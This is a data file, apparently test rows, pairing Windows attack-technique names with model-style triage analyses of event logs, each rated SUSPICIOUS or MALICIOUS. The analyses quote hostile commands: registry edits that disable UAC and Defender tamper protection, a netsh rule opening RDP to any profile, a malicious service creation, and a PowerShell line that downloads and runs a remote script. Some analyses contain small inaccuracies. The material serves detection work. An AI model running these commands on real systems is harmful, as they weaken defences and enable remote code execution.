3. **Endpoint Examination**: Conduct forensic analysis on the CEO's endpoint to determine if malware or unauthorized scripts were executed.

4. **Network Monitoring**: Check for unusual outbound connections, especially looking for data exfiltration or communication with known malicious IPs.

5. **Security Enhancement**: Deploy monitoring rules for time changes and usage of utilities like `wevtutil.exe` and `cmd.exe` to allow for prompt detection.

**Resolution: SUSPICIOUS** - The logs contain activity that doesn't look right and requires further investigation to determine the full scope and impact."
Disable UAC notification via registry keys,"**Detailed Analysis:**

Upon reviewing the provided Windows event logs, several activities stand out that merit further investigation:

1. **Kernel Time Changes:**
   - There are multiple entries in the System and Security logs under Microsoft-Windows-Kernel-General with EventID ""24"" and ""1"". These events indicate that the system time has been adjusted multiple times in a short period. These changes were executed by `svchost.exe` under the ""LOCAL SERVICE"" account. While legitimate, frequent or unauthorized time changes can be concerning as attackers may manipulate system time to cover their tracks or interfere with scheduled tasks. However, no direct evidence of malicious control is present.

2. **Security Concerns:**
   - In the Sysmon log, a process creation under the EventID ""1"" indicates `cmd.exe` was run with a command to modify the registry: 
     ```
     ""cmd.exe"" /c reg add ""HKLM\SOFTWARE\Microsoft\Security Center"" /v UACDisableNotify /t REG_DWORD /d 1 /f
     ```
     This command disables User Account Control (UAC) notifications, which is a common technique employed by malware to lower the security posture of the system without user knowledge.

3. **Suspicious Processes:**
   - Multiple instances of `wevtutil.exe`, `conhost.exe`, and `whoami.exe` executed in quick succession under an admin account. `wevtutil.exe` is a legitimate tool but can be misused to manipulate or clear event logs.
   - `whoami.exe` is often used to verify privileges and context during attacks.
   - While `conhost.exe` and `whoami.exe` are legitimate, rapid or unknown contextual invocation suggests potential post-exploitation behavior.

4. **EdgeUpdates:**
   - There are numerous entries related to Microsoft Edge Update processes running as the SYSTEM account, which can be routine system maintenance. No clear signs of exploit were identified here.

**Assessment:**

The log entries do not present unequivocal evidence of a compromise; however, certain behaviors like time changes, disabling UAC notifications, and the rapid spawning of potentially administrative tools (`cmd.exe`, `whoami.exe`, `wevtutil.exe`) indicate possible post-exploitation framework activities or unauthorized changes that could be suspicious.

**Resolution: SUSPICIOUS**

While some activities could be benign administrative tasks or routine processes, without context, several entries warrant further investigation, especially the registry modification command that disables UAC notifications and frequent time changes. It is advisable to review the machine's recent administrative activities, confirm the legitimacy of processes run by the `admin_test` account, and ensure changes to system settings were authorized. Additionally, analyze potential system exploits that may lead to this behavior and investigate the source of the command execution."
Indirect Command Execution - conhost.exe,"Upon reviewing the provided event logs, I've noted the following observations:

1. **Time Change Events:**
   - Security logs record several Event ID 4616, which documents system time changes initiated by `svchost.exe`. Changes in system time can sometimes be linked to attempts to manipulate logs or evade detection, but these events appear to involve time synchronization activities, typically benign when done by system processes.

2. **Edge Update Activity:**
   - Numerous Sysmon logs indicate activities by `MicrosoftEdgeUpdate.exe`, spanning process creation and command-line executions. These entries are consistent with legitimate update processes of Microsoft Edge, particularly noting high integrity levels and registrations performed by `NT AUTHORITY\SYSTEM`. These activities seem legitimate and part of routine update mechanisms.

3. **Command Prompt and Notepad Execution:**
   - There is a suspicious command line execution captured in a Sysmon log:
     - `cmd.exe` executed `conhost.exe ""notepad.exe""`, which is not a typical operation and could indicate some level of scripting or automated process execution. The use of `cmd.exe` to run a GUI application like Notepad, especially concerning the logged-on user's high integrity level, might require further examination to ensure it wasn't part of suspicious automation or scripting.

4. **General Context:**
   - Various processes executed with a high integrity level under the `admin_test` account show expected behavior from a system operational perspective, like the execution of `whoami.exe` and `HOSTNAME.EXE` for user and machine identification. These do not inherently indicate malicious intent within the data given.

**Risk Assessment:**

- The logs mostly show benign system update operations and regular administrative tasks.
- The anomaly with the `cmd.exe` executing `notepad.exe` needs further scrutiny to determine if it was an unauthorized or malicious script or process automation.

**Guidance on Proceeding:**

1. **Monitoring & Verification:**
   - Verify if there was any user confirmation or scheduled task related to the `cmd.exe` executing `conhost.exe ""notepad.exe""`.
   - Analyze other logs for possible related suspicious activity or corroborating alerts from security systems.
   - Consider deploying additional monitoring or alerts for similar activities to catch potential scripting or automation exploits.

2. **Communication:**
   - Discuss findings with the incident response or security team, emphasizing the need for reviewing scheduled tasks or scripts running under high privilege accounts.

Final Resolution: **SUSPICIOUS** - While most logs describe typical system activities, the specificity of the command execution context warrants closer examination to rule out any potential compromise or inadequate process handling."
Activate Windows NoRun Group Policy Feature,"After a thorough analysis of the provided logs, here is a detailed assessment of the observed activity:

### Observations:

1. **Whoami and Hostname Executions:**
   - Multiple executions of `whoami.exe` and `hostname.exe` were observed:
     - These actions typically list the current user and machine name, not inherently suspicious or indicative of malicious behavior. Often used by scripts or administrators for environmental checks.

2. **Command-Line and Registry Modifications:**
   - The execution of `cmd.exe` with command-line arguments modifying the registry:
     - `""cmd.exe"" /c reg add ""HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer"" /v NoRun /t REG_DWORD /d 1 /f""`
     - This command-line argument is modifying user policies which could restrict features available in the Explorer environment, potentially disabling certain operations.
     - This action stands out as it is often seen in attempts to restrict user actions, potentially part of a malware process or unauthorized scripts.

3. **Use of `wevtutil.exe`:**
   - Multiple executions of `wevtutil.exe`:
     - `wevtutil` is typically used for managing event logs. It can be benign when used appropriately, but repeated or unexplained usage might suggest attempts to tamper with or erase event logs which could hinder forensic investigations.

4. **Microsoft Edge Installer Activity:**
   - Multiple executions related to Microsoft Edge update:
     - `MicrosoftEdge_X64_130.0.2849.46_129.0.2792.89.exe` and `setup.exe` seen running with updates.
     - These installer executions align with legitimate software updates as part of routine administrative tasks or automatic updates, specifically since they originate from known Microsoft locations and are executed under the `NT AUTHORITY\SYSTEM` user, which is consistent with system operations.

5. **Time Service and Network Service Operations:**
   - Observed system time adjustments and service executions, `svchost.exe`, `sppsvc.exe`, and other network/service processes:
     - These are generally legitimate service operations. The system time adjustment logs do not show any significant anomalies apart from expected time synchronizations and adjustments.

### Assessment:

- **Suspicious Activity:**
  - The execution of the `cmd.exe` with registry modification raises a significant red flag. Such modifications can impact system security or user experience negatively and could be leveraged by malware or unauthorized users to enforce restrictions or impair system functionality.
  
- **Wevtutil Activity:**
  - Repeated execution might indicate attempts to manipulate log visibility, keep under observation and verify the context of its execution.

- **Benign or Legitimate Activity:**
  - Microsoft Edge update processes appear to be legitimate based on the paths and command-line parameters.
  - Whoami and Hostname executions, along with events related to the system time service and network services, are not indicating any direct threats based on current evidence.

### Conclusion:

**Resolution:** **SUSPICIOUS**

The presence of registry manipulation using `cmd.exe` and changes to user policies could point towards either malicious intent or the use of powerful scripts/configuration changes without appropriate oversight. Further investigation is warranted, specifically into why these registry changes were made, who authorized them, and the context of their execution. Steps to investigate:

1. Identify any recent changes or new software/scripts implemented by administrators that might explain registry activity.
2. Check the system for any potential unauthorized access or other anomalies surrounding this period.
3. Increase monitoring for similar process executions and policy changes.

After more information is gathered on these registry changes, clarifying intent and the justification behind them, conclusions can be further refined towards benign or potentially more severe actions."
Creating W32Time similar named service using sc,"**Analysis of Windows Event Logs:**

1. **Service Creation:** 
   - **Event ID 7045 (Service Control Manager):** A service named ""win32times"" was created with the command `cmd /c start c:\\data.004_NonExistingScript.ps1` run as a user mode service using the LocalSystem account. This is suspicious for several reasons:
     - The service appears to be created to execute a non-existing script, `c:\\data.004_NonExistingScript.ps1`, which raises concerns about the intent of the creator.
     - Running under the LocalSystem account provides very high privileges, which is generally unnecessary for running custom scripts unless there is an intention to run highly privileged tasks.

2. **Sysmon Events:**
   - Multiple instances of `wevtutil.exe` and `conhost.exe` are being executed by the user ""SERVER002\\admin_test"". While not inherently malicious, `wevtutil.exe` is commonly used to query or delete event logs, which can be a sign of an attempt to cover tracks.
   - **Event ID 1 (Process Creation) & Event ID 5 (Process Termination):** 
     - Execution of `cmd.exe` with the command `cmd.exe /c sc create win32times binPath= ""cmd /c start c:\\data.004_NonExistingScript.ps1"" & sc qc win32times`. This aligns with the suspicious service creation log and suggests an unauthorized script execution attempt.

3. **Security Events:**
   - **Event ID 5379:** Multiple failed credential accesses, with ""return code 3221226021."" Although failed credential access attempts can occur during legitimate processes, their frequency and the context of other suspicious activities necessitate closer scrutiny.
   
4. **Other Observations:**
   - Legitimate updates and system processes such as the Microsoft Edge Update and Windows Update processes are occurring, which appear normal and are not linked to the suspicious activities.

**Assessment:**

- **Suspicious Activities:**
  - The creation of a Windows service to execute a potentially non-existent script as LocalSystem is highly suspect. It indicates an attempt to persist potentially malicious behavior with elevated privileges.
  - The use of `wevtutil.exe` might suggest efforts to manipulate or cover up event logs.
  - The combination of these actions suggest at least an unauthorized use of the system with potentially malicious intentions.

**Recommendation:**

- Conduct a deeper investigation into the files and directories mentioned, particularly `c:\\data.004_NonExistingScript.ps1`.
- Check for additional services created around the same time and review user ""SERVER002\\admin_test"" activities for unauthorized actions.
- Verify the intent and necessity of script executions and service creations on endpoint systems.
- Analyze any connection logs or related network traffic around these events for other illicit activities.
- Consider conducting a full integrity check and malware scan on the system.
- Strengthen monitoring and auditing entries for key activities such as service creations and credential accesses.

**Resolution: SUSPICIOUS**

Further investigation is needed to ascertain the scope and impact of the activities and to prevent potential future unauthorized or malicious actions."
Open a local port through Windows Firewall to any profile,"**Detailed Analysis**:

1. **Suspicious Network Configuration**: The logs indicate a PowerShell command was executed to open the RDP port (3389) on the firewall to any connection. This action is evident from the following command seen in both the Sysmon and PowerShell logs:

   ```
   powershell.exe & {netsh advfirewall firewall add rule name=""Open Port to Any"" dir=in protocol=tcp localport=3389 action=allow profile=any}
   ```

   This activity is highly unusual and potentially dangerous, as it allows remote access to the system without any restriction, increasing the risk of unauthorized access significantly.

2. **Process Execution Context**: The activity was executed by the user `SERVER002\admin_test` with high integrity level, indicating administrative rights. The action originated from a PowerShell session (`powershell.exe`), which further executed `netsh.exe` to modify the firewall settings.

3. **Contextual Observations**:
   - **Conhost.exe**: Multiple entries show `conhost.exe` being executed as part of normal console operations linked to processes like `whoami.exe` and `hostname.exe`. These entries alone are benign, but in the context of the suspicious PowerShell activity, they might indicate attempts to understand the context of the executing user or system name.
   
   - **EdgeUpdate activities**: There are multiple entries for `MicrosoftEdgeUpdate.exe`, which appear standard and related to update processes, not necessarily suspicious by themselves. This appears to be ordinary update-related activity for Microsoft Edge.

4. **System Integrity Implications**: Opening port 3389 could lead to severe security implications, demonstrating possible compromise or misconfiguration. If this was not an intentional change made by authorized personnel, it warrants immediate investigation to ensure system integrity.

**Assessment**:
The behavior observed is clearly **SUSPICIOUS**. While the execution of `powershell.exe` with a command to open RDP on the firewall indicates activity that doesn't look right, I cannot definitively confirm it is malicious without additional context, such as confirmation of intent from authorized personnel or correlation with any other known malicious campaigns.

**Guidance on How to Proceed**:
1. **Immediate Action**: Revert the firewall change by blocking port 3389 if it was not authorized. Review the firewall policy to ensure no unintended open ports remain.

2. **Further Investigation**:
   - Determine if the `admin_test` account activity was legitimate by consulting user logs and checking with the user.
   - Examine any other recent changes or suspicious activities on the host that might indicate further compromise.
   - Review system access logs, especially for any unusual or unauthorized remote access attempts.
   - Check for indicators of lateral movement within the network, especially if the machine is exposed to the internet.

3. **Monitoring and Alerting**: Implement strict monitoring on this host and the network for related activities. Set up alerts for any future attempts to open external ports via scripts or unauthorized changes to firewall settings.

**Resolution**: **SUSPICIOUS** - The identified activity needs more investigation to determine whether it was a legitimate action or part of malicious activity."
Abusing Windows TelemetryController Registry Key for Persistence,"Upon analyzing the provided logs, several activities and patterns emerged that are worth noting for the investigation:

1. **Use of Administrative Commands and Tools:**
   - The logs show multiple executions of common administrative tools such as `wevtutil.exe`, `conhost.exe`, `hostname.exe`, and `whoami.exe`. These tools can be legitimately used by administrators but can also signify suspicious activities if used out of the ordinary or in quick succession.
   - The frequent invocation of `wevtutil.exe` by the user `SERVER002\\admin_test` suggests possible log clearing or manipulation activities. This could be concerning if unauthorized or unusual.

2. **Registry Modification Using CMD and REG:**
   - A suspicious command involving `cmd.exe` indicates a registry change to add a key related to `TelemetryController` with `notepad.exe` as a data value. While `notepad.exe` is a legitimate application, the context of registry modification suggests the possibility of persistence or alteration for telemetry purposes.

3. **Frequent Microsoft Edge Update Activity:**
   - There is high activity involving Microsoft Edge Update processes, which might seem normal for updated operations; however, the `MicrosoftEdgeUpdate.exe` executing from a `Temp` directory (`EUBBF3.tmp`) could potentially indicate execution from an unusual location. This behavior, coupled with numerous `EdgeUpdate` related events and processes running as `NT AUTHORITY\\SYSTEM`, might warrant further scrutiny to ensure that the updates are legitimate and not masquerading or performing unauthorized tasks.

### Assessment:

- **Potential Indicators of Compromise:** The logs hint at behaviors that could align with malicious intents, such as registry modifications and the unusual use of logging utilities potentially to cover tracks. The frequent process execution with the `admin_test` context suggests either heightened administrative tasks or potential abuse of privileged accounts.
  
- **Risks and Threats Identified:** The use of system tools in rapid succession and the modification of registry settings without additional context can be interpreted as preparation steps for lateral movement or persistence strategies by threat actors. Furthermore, unusual Microsoft Edge Update execution from temporary directories raises flags for potentially unauthorized software or package executions.

### Guidance and Recommendations:

- **Resolution: SUSPICIOUS** - The activities observed in the logs are suspicious, though not overtly confirmed as malicious. They deviate from typical behavior and warrant a deeper investigation to determine the context and intent behind these actions.

1. **Further Investigation Required:**
   - Conduct a detailed review of user `admin_test` actions and logs to determine the motivations for executing numerous system tools.
   - Verify the registry changes and assess the impact of the `TelemetryController` modification to ascertain potential risks for data exfiltration or system compromise.
   - Evaluate the source of the Microsoft Edge Update processes, especially those originating from temporary directories, to confirm legitimacy and rule out any impersonation attacks.

2. **Review and Hardening:**
   - Strengthen monitoring around key administrative tool executions to detect unauthorized actions.
   - Implement stricter access controls and Identity and Access Management (IAM) measures for privileged users.
   - Consider endpoint monitoring solutions to provide visibility into command line executions and registry changes for early detection of abnormal activities.
   
By conducting a thorough investigation and implementing these recommendations, the company can better understand the root cause of the activities and enhance its security posture to prevent potential breaches."
UACME Bypass Method 56,"Based on analyzing the Sysmon logs provided, the following observations were made:

1. **Suspicious Execution Chain**: 
   - The logs indicate the execution of `cmd.exe` with a peculiar command-line argument that references `C:\Users\ADMIN_~1\AppData\Local\Temp\file\..\Externalfiles\script\56 Akagi64.exe`. This could suggest an attempt to execute a script or a binary potentially disguised or hidden in directories.
   - The hash of `Akagi64.exe` process (SHA256=BADF4752413CB0CBDC03FB95820CA167F0CDC63B597CCDB5EF43111180E088B0) should be investigated further for any known malicious attributes.

2. **Parent Processes and Integrity Level**:
   - The parent process for some critical operations (`cmd.exe` invoking other process/script) is `wsmprovhost.exe`, which is a legitimate Windows service but could be maliciously used if hijacked by malware.
   - Processes are executed with a high integrity level, indicating potential privilege escalation or use of an admin account (`SERVER002\admin_test`).

3. **Use of Potentially Malicious Scripts/Executables**:
   - The execution of unknown executables, specifically `Akagi64.exe`, without clear justification and not typically associated with regular operations.

4. **Unusual Microsoft Edge Update Activity**:
   - Numerous entries for `MicrosoftEdgeUpdate.exe`, some operating out of `C:\Program Files (x86)\Microsoft\Temp\` which might suggest abnormal behavior. It's common to see updates, but the directory usage and frequency suggest it should be reviewed.

5. **Wevtutil and Conhost Activity**:
   - Multiple instances of `conhost.exe` and `wevtutil.exe` are noted, potentially indicating command execution or log tampering attempts.

6. **Defender Status**:
   - Windows Defender is active, as indicated by multiple system messages about its status being ""ON,"" implying no antivirus disruptions occurred.

### Assessment:

- **Resolution**: **SUSPICIOUS**

The event logs do not conclusively prove malicious activity but do exhibit characteristics that are inconsistent with normal user behavior or system operation. The execution chain, high integrity level processes, and presence of unknown executables/script require further examination, especially focusing on `Akagi64.exe`.

### Recommendations:

- **Immediate Actions**:
  - Perform endpoint detection and response (EDR) scan on `Server002` focusing on identified executables and scripts (`Akagi64.exe`).
  - Cross-reference hashes with known threat databases to identify if any match known malware signatures.
  - Review user account activities and privilege escalations for `SERVER002\admin_test`.

- **Further Investigation**:
  - Analyze network traffic for any unusual outbound connections which might be indicative of command-and-control (C2) activity.
  - Check system for any persistent mechanisms or changes in scheduled tasks, startup items, or registry keys.
  
- **Remediation and Monitoring**:
  - Isolate the system if any malware is confirmed to prevent lateral movement.
  - Enhance logging and monitoring for processes with high integrity levels and unusual parent-child relationships in process trees.
  
Analyzing these aspects should provide conclusive results on whether further escalation to threat response is necessary."
Tamper Win Defender Protection,"Upon analyzing the provided Windows event logs, several events stand out as potential indicators of suspicious activity:

1. **Time Change Events**: 
    - The security log and system log events indicate a time change occurring almost simultaneously on the system. The time altered backward from `2024-10-24 17:27:08.9656852` to `2024-10-24 17:27:06.0960022`. The backward adjustment of system time can be indicative of attempts to bypass scheduled security updates or to hide malicious activity timestamps.

2. **Registry Modification**:
    - A Sysmon log entry reveals the execution of a command via `cmd.exe` that modifies the registry setting for Windows Defender's `TamperProtection` feature, setting its value to `0` (disabled). This action is executed by `admin_test` with high integrity and indicates an attempt to disable security protections on the machine, which is a common behavior for malware attempting to evade detection.

3. **Uncommon Use of System Utilities by a Regular User**:
    - Several instances of `wevtutil.exe` and `conhost.exe` processes are executed by the `SERVER002\\admin_test` user. While these can be legitimate, they are also utilities that can be misused for stealth operations or log manipulation. The frequency and context (immediate use after time change) suggest that these actions need further scrutiny.

4. **Suspicious Sequence in Process Execution**:
    - The sequence of commands and process creation from `cmd.exe` leading to `reg.exe` and `conhost.exe` further supports potentially malicious behavior aimed at disabling security features. Additionally, processes such as `HOSTNAME.EXE` and `whoami.exe` executed in conjunction may be part of an attacker’s reconnaissance phase post-access.

5. **Regular Processes with High Privilege Usage**:
    - Many processes, including Windows Update components (`MicrosoftEdgeUpdate.exe`), are executed with `System` integrity, potentially indicating the system is in the process of receiving updates. However, integrated with the earlier observations, these activities can be leveraged for privilege persistence or lateral movement if exploited by a malicious actor.

### Assessment and Resolution:

The convergence of the time change event, the registry modification disabling security settings, and the usage of system utilities by a non-system user with elevated privilege strongly suggests potential malicious activity. The context and sequence of these events correlate with tactics often used by adversaries to establish persistence, evade security mechanisms, or prepare for further malicious activities on the system.

**Resolution: MALICIOUS**

The identified behavior is consistent with common exploitation methods aimed at degrading system defenses and potentially preparing the host for data exfiltration or other malicious operations. Immediate action should include:
- Restoring the altered security settings in the registry.
- Investigating the source of the `admin_test` user commands.
- Conducting a full system scan using updated malware signatures.
- Reviewing server-wide security policies and examining logs for signs of lateral movement or other compromised systems."
Control Panel Items,"**Detailed Analysis:**

1. **Application Log Analysis:**
    - There are two instances of ""edgeupdate"" events with the message ""Service stopped"". These appear related to Microsoft Edge updates and are categorized at a low level, which does not typically indicate an issue. These events can be considered normal within the context of Windows systems when updating software.

2. **Sysmon Log Analysis:**
    - A sequence of `powershell.exe`, `wevtutil.exe`, and `cmd.exe` command invocations, all executed by the user ""SERVER002\\admin_test"". Notably, `wevtutil.exe` is used for event log management, and its presence in logs without further context can sometimes indicate log clearing or modification attempts, a suspicious behavior.
    - `cmd.exe` execution with a command line (`""cmd.exe"" /c control.exe ""C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\data.002\\bin\\calc.cpl""`) is suspicious as running Control Panel components under temporary directories can be an indicator of malicious activity.
    - Further suspicious is the chain of `rundll32.exe` and `rundll32.exe` being used with non-standard command lines involving `calc.cpl`, which could hint at malicious payload or library loading.
    - The execution of `whoami.exe` and `hostname.exe` is benign in isolation but can suggest enumeration activity, especially when run in sequence.
    - Tools such as `whoami.exe` and `hostname.exe` being run alongside potentially suspicious executions and the presence of temporary directories suggest potential preparation or execution of a compromise.
    - There are repetitive executions of `MicrosoftEdgeUpdate.exe` with installation paths and command-line arguments, indicating a legitimate update process though the volume of events could hide other malicious processes.

**Assessment:**
- The combination of the Sysmon logs' activities can indicate a malicious behavior pattern when taking into account the powershell, whoami, conhost, and especially the control panel and rundll32 activities originating from temporary directories. 
- Normal behavior would not typically string these tools and directories together unless involved in a scripted compromise attempt or powerful admin-driven task sequence without user educational knowledge.

**Resolution: SUSPICIOUS:**

- The logs exhibit behavior that is not typical for standard operations and point towards potentially nefarious activity, particularly with experimental use of directories that should not house executable content for administrative and control tools. It deserves more in-depth investigation to confirm whether malicious actions were taken or intended. Further analysis is suggested by examining network logs, correlating with any alerts triggered, and checking the integrity of critical system files these executables generated or came in contact with."
WMI Win32_Product Class - Execute Local MSI file with an embedded EXE,"Upon reviewing the logs, here are the observations and analysis with respect to potentially suspicious activity:

1. **Suspicious PowerShell Execution**:
   - There are multiple instances of PowerShell executing with the command `Invoke-CimMethod -ClassName Win32_Product -MethodName Install` and targeting a package location at `C:\Users\ADMIN_~1\AppData\Local\Temp\file\data.007\bin\data.007_EXE.msi`. The context suggests that a MSI package is being installed via PowerShell, which deviates from regular software installation processes as these would typically use more standard package managers or system prompts.
   
2. **Unusual Temporary File Execution**:
   - A temporary file named `C:\Windows\Installer\MSI9CF4.tmp` is being executed with an unusual command line `""Hello, file file from an EXE!""`. It originates from `C:\Windows\System32\msiexec.exe /V`. Running executables from temporary files, especially with non-standard command lines, could be indicative of suspicious activity, possibly due to malicious processes attempting to disguise or temporarily execute unauthorized applications.

3. **High Privilege Processes**:
   - Many of the processes observed, such as `powershell.exe`, `hostname.exe`, `whoami.exe`, and the temporary installer executable, are running at a high integrity level or as `NT AUTHORITY\SYSTEM`. High privileges used in conjunction with unusual commands raise concern about potential privilege escalation or exploitation attempts.

4. **Normal Update Activity**:
   - There are also numerous instances of Microsoft Edge Update processes (`MicrosoftEdgeUpdate.exe` and related components) executing various command lines aimed at keeping Microsoft Edge current. This type of system maintenance, especially corroborated by log details such as `/svc` and `/update` parameters, appears routine and not indicative of misuse.

5. **No overt signs of a compromise**:
   - Other routine processes such as `sppsvc.exe` (Software Protection Service), `TiWorker.exe` (Windows Modules Installer Worker), and `TrustedInstaller.exe` are running with expected parameters and privileges, aligning with regular system operations.

### Assessment and Recommendation:

- **Assessment**: The combined execution of PowerShell scripts to install MSI packages from temporary directories, alongside unusual temporary file execution with extraordinary command lines, suggests potentially suspicious activity. However, there are no direct signs of an ongoing malicious compromise or threat within available logs.
  
- **Recommendation**: This activity should be marked as **SUSPICIOUS**. It requires further investigation to discern whether the MSI package and temporary file execution are sanctioned internal processes or if they indicate unwarranted actions. Consider:
  - Verifying the legitimacy of the installed MSI files and their source.
  - Examining user activity, permissions, and any correlating alerts from associated security systems (e.g., EDR).
  - Conducting deeper threat hunting to ensure no further indicators of compromise are present on the system or network.

Therefore, the resolution for the investigation is **SUSPICIOUS**. Further examination and context are necessary to conclude definitively on the nature of this behavior."
Disable Windows Toast Notifications,"## Detailed Analysis:

### System Log:
1. **Event ID 24 & 1 (Kernel-General):** 
   - **Time Discrepancy:** 
     - The logs indicate multiple changes to the system time within a very short period. This is often legitimate as it may involve time synchronization processes, but a rapid sequence of time adjustments can sometimes indicate attempts to obscure system activity by altering timestamps.
   - **Process Involved:** 
     - The process responsible for this, 'svchost.exe', is a legitimate system process; however, it is commonly targeted for exploitation.
   - **User:** 
     - The events show activity under System user accounts like ""NT AUTHORITY\SYSTEM"", which is normal for these types of activities.

### Sysmon Log:
1. **Event ID 5 (Process Termination) & ID 1 (Process Creation):**
   - **Frequent Use of `wevtutil.exe` and `conhost.exe`:**
     - `wevtutil.exe` and `conhost.exe` are legitimate utilities but can indicate a script or manual operation to manipulate Event Logs if used suspiciously.
     - Multiple instances of these processes are launched by the user ""SERVER002\admin_test"", which could either be routine administration or suspicious if not usual activity.
   
2. **Event ID 1 (Process Creation) and Activity of `cmd.exe` and `reg.exe`:**
   - **Command-Line Execution By `cmd.exe`:**
     - `cmd.exe` is seen executing a command to modify the Windows registry to disable toast notifications. This is suspicious as it alters the system configuration typically altered by software or administrative scripts. 
   - **Parent-Child Relationships:**
     - The parent process for many suspicious activities is `wsmprovhost.exe`, a legitimate process used for PowerShell Remoting and other management tasks. 
     - However, the chain of execution leading to registry modifications suggests potential misuse (`cmd.exe` spawning `reg.exe`).
   
3. **Hash Values:**
   - Check for known-bad SHA256 hashes is vital, although hashes in the provided logs do not immediately raise flags without comparing against a threat intelligence database.

### Application Log:
1. **Event ID 16384 (Security-SPP):**
   - **Software Protection Platform Service:**
     - This log entry reports routine information and does not by itself indicate a security issue.

## Assessment and Resolution:

### Assessment:
- The frequent short-interval system time changes combined with registry modifications and frequent `cmd.exe` usage might suggest a script or manual operation affecting system configuration.
- The rapid sequence of actions with legitimate tools (like `reg.exe`, `wevtutil.exe`) often aligns with tactics used by adversaries to hide tracks or maintain persistence.

### Resolution:
- **Resolution: SUSPICIOUS**
  - While there's no conclusive evidence of active malware based solely on these logs, the operations performed and their frequency are unusual for regular administrative duties on a CEO's machine. The combination of time changes and registry modifications without a clear and authorized explanation necessitates further investigation.

### Guidance:
1. **Validate Activity:**
   - Check with the system administrator or the user (""admin_test"") to confirm whether they executed commands related to the registry change and if these changes align with any authorized maintenance or system configuration tasks.
   
2. **Further Investigations:**
   - Conduct file integrity checks and scans for anomalies using threat intelligence tools to investigate potential unauthorized scripts or malware.
   - Review any additional context (e.g., network logs or recent system updates) for unusual access patterns or other signs of compromise.
   
3. **Monitoring and Alerts:**
   - Enhance monitoring with specific alerts for changes to registry keys of interest and for repeated automated executions of `cmd.exe` and `reg.exe` processes."
Obfuscated Command in PowerShell,"Based on the analysis of the provided Windows event logs, the following observations are made:

1. **Application and System Logs**: The system and Windows update logs appear to show normal activity associated with system time adjustments and an update to the security intelligence for Microsoft Defender Antivirus. The update process is routine, and the synchronization with `time.windows.com` is expected behavior for time service operations. There is no indication of malicious intent or activity from these logs.

2. **Windows PowerShell Logs**: The PowerShell activity indicates the execution of an obfuscated command. This involves dynamic string generation and execution, a behavior commonly associated with malicious activities such as malware execution or penetration testing. The complicated and encoded structure suggests attempts to evade detection, which is typically suspicious.

3. **Security Logs**: There are several Event ID 5379 entries indicating issues with authentication or access tokens, specifically concerning 'MicrosoftAccount:user=02txoixylodcstop'. These might suggest unsuccessful credential operations or incorrect configuration, but on their own, they don't necessarily indicate a compromise without further context.

4. **Sysmon Logs**: The Sysmon logs show processes like `wevtutil.exe`, `conhost.exe`, `whoami.exe`, and `powershell.exe` executed by a user account `SERVER002\\admin_test`. While the usage of `whoami.exe` and `powershell.exe` is not in itself suspicious, their presence as part of a sequence involving obfuscated PowerShell commands raises concerns.

5. **Obfuscated PowerShell Command**: 
   - The PowerShell log indicates the use of dynamic string evaluation and execution, suggesting that this activity may be an attempt to mask potentially harmful behavior. This method is characteristic of malware that tries to hide its operations from security software.

**Assessment**:
- **Suspicious Activity**: The presence of the obfuscated PowerShell command makes the activity stand out as suspicious. This type of command could potentially lead to malicious actions if further investigated and confirmed to match known malicious patterns or scripts.

**Recommendations**:
- **Detailed Review**: Conduct a detailed review and decode the PowerShell script to understand its purpose fully.
- **Monitoring**: Increase monitoring of PowerShell executions and related activities on the CEO's machine and network for any signs of abnormal activities or patterns matching known threats.
- **Threat Intelligence**: Cross-reference the behavior and scripts with threat intelligence databases to identify any known malware patterns.

**Resolution**: **SUSPICIOUS** - The logs contain activity that doesn't look right and needs further investigation to rule out or confirm malicious intent."
WinPwn - UAC Bypass DccwBypassUAC technique,"**Analysis of Windows Event Logs:**

1. **System Log Analysis:**
   - The entries in the System log show changes in system time by the `svchost.exe` process. The system time was rolled back from ""2024-11-02 12:14:43.0515844"" to ""2024-11-02 12:14:30.5307079"". This is an unusual behavior as it can be an indicator of an attempt to bypass security controls or log tampering.

2. **Security Log Analysis:**
   - The Security logs record the same time change events as seen in the System logs. The `svchost.exe` process is responsible for this, operating under the `LOCAL SERVICE` account. The time rollback, especially done several times very closely, is anomalous and concerning in a security context.

3. **Windows PowerShell Log Analysis:**
   - The PowerShell logs reveal that an `iex(new-object net.webclient).downloadstring()` command was executed to download and execute a script from `https://raw.githubusercontent.com/script/Creds/master/script/script`. This is highly indicative of malicious activity, as it involves remote code execution from an external source.

4. **Sysmon Log Analysis:**
   - The Sysmon logs indicate multiple executions of common Windows utilities such as `wevtutil.exe`, `conhost.exe`, `hostname.exe`, `whoami.exe`, and most notably `powershell.exe` with similar remote code execution content observed in the PowerShell logs. The execution of these processes, particularly the PowerShell command-line associated with downloading and executing scripts, supports the identification of suspicious or malicious activity.

5. **Application Log Analysis:**
   - The Application logs are benign in this context, reflecting normal system processes and Windows Defender being active.

**Assessment:**
- The combination of system time manipulation, and unauthorized execution of PowerShell to download scripts from an external source, indicates malicious activity. The behavior strongly suggests a compromise of the host system where PowerShell is being used to execute possibly malicious scripts. The time rollback could be an attempt to evade detection or tamper with logging data to hide tracks.

**Resolution:** **MALICIOUS**

**Recommendations:**
1. **Immediate Isolation**: Isolate the affected system (Server002) from the network to prevent further potential spread or communication with external malicious servers.
2. **Forensic Investigation**: Conduct a full forensic analysis of the system to identify any additional payloads dropped by the downloaded script and check for persistence mechanisms.
3. **Review and Remediation**: Inspect other systems for similar activities and review the security controls in place, particularly those involving PowerShell execution and time manipulation.
4. **Update Security Tools**: Ensure that security tools are updated with the latest virus definitions and check logs for additional anomalies.
5. **Rebuild System**: If the breach is confirmed with significant impact, consider rebuilding the system from a known good backup to ensure all unauthorized changes are removed."
InstallUtil Install method call,"## Detailed Analysis of the Logs

### Windows PowerShell Log Analysis
- **Suspicious PowerShell Activity**: The logs display PowerShell script execution involving the functions `Invoke-BuildAndInvokeInstallUtilAssembly` and the `InstallUtilTestHarness.ps1` script. The script seems to be using InstallUtil, which is known for its dual-use capabilities. Hackers often exploit this utility for executing code.
- **Observed Activities**: 
  - It involved dynamically creating a .NET assembly (likely `data.004.dll`) and executing InstallUtil commands aimed at checking Install method outputs versus expected results.
  - The script indicates writing certain ""Constructor_"", ""Install_"", and ""Uninstall_"" texts to a file, which indicates an attempt to persist or validate the execution.

### Sysmon Log Analysis
- **Process Creation and Execution**:
  - Multiple executions of `InstallUtil.exe` and various .NET framework tools such as `csc.exe` and `cvtres.exe`, which are mostly associated with compiling and executing .NET assemblies, were observed. These often accompany code compilation and execution.
